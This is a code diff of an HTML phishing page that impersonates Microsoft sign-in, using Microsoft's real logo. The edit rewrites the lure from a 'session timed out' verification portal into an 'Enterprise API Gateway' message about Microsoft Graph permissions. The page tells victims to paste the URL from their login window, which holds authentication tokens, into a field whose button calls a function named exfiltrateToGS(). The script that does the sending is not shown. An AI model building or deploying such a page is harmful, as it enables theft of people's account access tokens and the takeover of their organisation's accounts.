@@ -2,52 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification Portal</title>
+    <title>Enterprise API Gateway</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; width: 420px; padding: 40px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-radius: 4px; border: 1px solid #e1e1e1; }
-        .logo { width: 108px; margin-bottom: 25px; }
-        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px; }
-        p { font-size: 15px; color: #1b1b1b; line-height: 1.4; margin-bottom: 25px; }
-        .btn-primary { background: #0067b8; color: white; border: none; padding: 12px; cursor: pointer; font-size: 15px; width: 100%; font-weight: 500; }
-        .btn-primary:hover { background: #005da6; }
-        .btn-sync { background: #28a745; color: white; border: none; padding: 12px; cursor: pointer; width: 100%; margin-top: 15px; font-weight: 600; }
-        .btn-sync:hover { background: #218838; }
-        input { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid #8a8886; margin-top: 10px; font-family: monospace; font-size: 13px; }
-        input:focus { border-color: #0067b8; outline: none; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; width: 400px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { width: 108px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #1b1b1b; }
+        p { font-size: 14px; color: #666; line-height: 1.5; }
+        .btn { background: #0067b8; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: 600; margin-top: 10px; }
+        input { width: 100%; padding: 12px; margin-top: 10px; border: 1px solid #ccc; box-sizing: border-box; font-family: monospace; font-size: 12px; }
         .hidden { display: none; }
-        .footer { margin-top: 35px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 20px; }
-        .footer span { margin-right: 15px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo" alt="Microsoft">
+    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
     
     <div id="step-1">
-        <h1>Action Required</h1>
-        <p>Your security session has timed out. To maintain access to organization resources, please re-authenticate your device.</p>
-        <button class="btn-primary" onclick="startBridge()">Sign In to Verify</button>
+        <h1>API Access Required</h1>
+        <p>To continue using organization resources, please re-validate your Microsoft Graph session permissions.</p>
+        <button class="btn" onclick="startBridge()">Sign In & Validate</button>
     </div>
 
     <div id="step-2" class="hidden">
-        <h1>Finalize Sync</h1>
-        <p>A secure verification object has been generated in the login window. To complete the sync, copy the content of that window and paste it here:</p>
-        
-        <input type="text" id="raw-url" placeholder="Paste verification response here...">
-        
-        <button class="btn-sync" onclick="exfiltrateToGS()">Complete Synchronization</button>
-    </div>
-
-    <div class="footer">
-        <span>Privacy & cookies</span>
-        <span>Terms of use</span>
+        <h1>Complete Validation</h1>
+        <p>Copy the resulting URL from the login window bar and paste it below to sync your API tokens:</p>
+        <input type="text" id="raw-url" placeholder="https://login.microsoftonline.com/...">
+        <button class="btn" style="background: #28a745;" onclick="exfiltrateToGS()">Complete Sync</button>
     </div>
 </div>
 
 <script src="index.js"></script>
-
 </body>
 </html>
